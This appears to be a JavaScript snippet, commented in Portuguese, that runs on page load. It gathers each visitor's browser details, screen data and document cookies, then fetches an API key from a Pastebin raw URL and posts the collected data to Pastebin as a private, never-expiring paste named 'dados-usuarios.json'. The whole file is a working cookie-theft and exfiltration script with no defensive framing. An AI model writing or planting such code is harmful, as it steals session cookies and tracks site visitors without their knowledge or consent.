function coletarDados() {
    const dados = {
        userAgent: navigator.userAgent,
        navegador: navigator.appName,
        plataforma: navigator.platform,
        tela: {
            largura: screen.width,
            altura: screen.height,
            profundidade: screen.colorDepth
        },
        cookies: document.cookie,
        localStorage: localStorage.length,
        sessionStorage: sessionStorage.length
    };

    // URL do Pastebin contendo a API Key
    const pastebinKeyUrl = 'https://pastebin.com/raw/L6LkHB3B';

    fetch(pastebinKeyUrl)
        .then(response => response.text())
        .then(apiKey => {
            // ID do Paste que será atualizado
            const pasteId = 'L6LkHB3B';

            // Converte os dados para JSON
            const jsonData = JSON.stringify(dados, null, 2);

            // Configura a URL da API do Pastebin
            const pastebinApiUrl = `https://pastebin.com/api/api_post.php`;

            // Parâmetros para recriar o conteúdo do paste
            const formData = new URLSearchParams({
                api_dev_key: apiKey.trim(), // Chave de desenvolvedor
                api_option: 'paste', // Cria ou substitui o paste
                api_paste_code: jsonData, // Dados JSON a serem enviados
                api_paste_name: 'dados-usuarios.json', // Nome do Paste
                api_paste_private: '1', // Paste privado
                api_paste_expire_date: 'N' // Nunca expira
            });

            // Faz a requisição POST para sobrescrever o conteúdo do paste
            fetch(pastebinApiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                console.log('Paste atualizado com sucesso:', result);
            })
            .catch(error => {
                console.error('Erro ao atualizar o paste no Pastebin:', error);
            });
        })
        .catch(error => {
            console.error('Erro ao recuperar a API Key do Pastebin:', error);
        });
}

// Chama a função quando a página carregar
window.onload = function() {
    coletarDados();
};
